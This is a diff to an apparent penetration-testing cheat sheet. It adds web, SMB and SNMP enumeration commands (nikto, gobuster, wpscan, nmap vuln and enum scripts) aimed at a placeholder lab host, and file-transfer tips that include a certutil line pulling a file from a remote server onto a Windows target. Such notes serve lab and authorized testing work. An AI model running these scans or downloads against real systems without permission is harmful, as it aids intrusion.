@@ -164,13 +164,15 @@ Can brute force files with metasploit or other scripts.
 
 #### 80: HTTP
 
-`nikto`
+Check /robots.txt, /admin, /login etc for quick wins
 
-`gobuster`
+`nikto -h http://10.10.10.10`
 
-Check /robots.txt
+`gobuster -u 10.10.10.10 -w /usr/share/wordlists/Seclists/Discovery/Web_Content/common.txt -t 80`
 
-`VHostScan`
+`gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/wordlists/Seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'`: spoofing heading
+
+`wpscan -u 10.10.10.10/wp/`
 
 #### 88: Kerberos
 
@@ -252,7 +254,7 @@ Servers running SMB are often vulnerable to MS17-010
 
 `nmap -sV -Pn -vv -p 139,$port --script=smb-vuln* --script-args=unsafe=1 -oN nmap-smb-vuln 10.10.10.10`
 
-`nmap -sV -Pn -vv -p $port --script=smb-enum-users -on nmap-smb-enum-users 10.10.10.10`
+`nmap -sV -Pn -vv -p $port --script=smb-enum-users,smb-enum-shares -on nmap-smb-enum 10.10.10.10`
 
 #### 143/993: IMAP
 
@@ -265,6 +267,8 @@ Servers running SMB are often vulnerable to MS17-010
 `snmpbulkwalk`
 
 `snmp-check -t 192.168.1.101 -c public`
+
+`snmp-check 10.10.10.10`
 
 `"nmap -sV -Pn -vv -p161 --script=snmp-netstat,snmp-processes -on nmap-snmp 10.10.10.1.`
 
@@ -549,9 +553,11 @@ While not priv esc, we can get current user credentials hash snarf via samba/htt
 ### Transferring Files
 
 * meterpreter upload
+* `python -m SimpleHTTPServer 80`
 * Linux: many options, wget, curl, ftp, check what is installed
 * Windows: TFTP (up to Windows XP by default), VBScript or Powershell, also check for FTP/Webdav/etc
 * Windows: Can use debug.exe to compile a program like nc as a last resort
+* Windows: `certutil.exe -urlcache -split -f https://myserver/filename outputfilename`
 
 ### Capturing Traffic
 
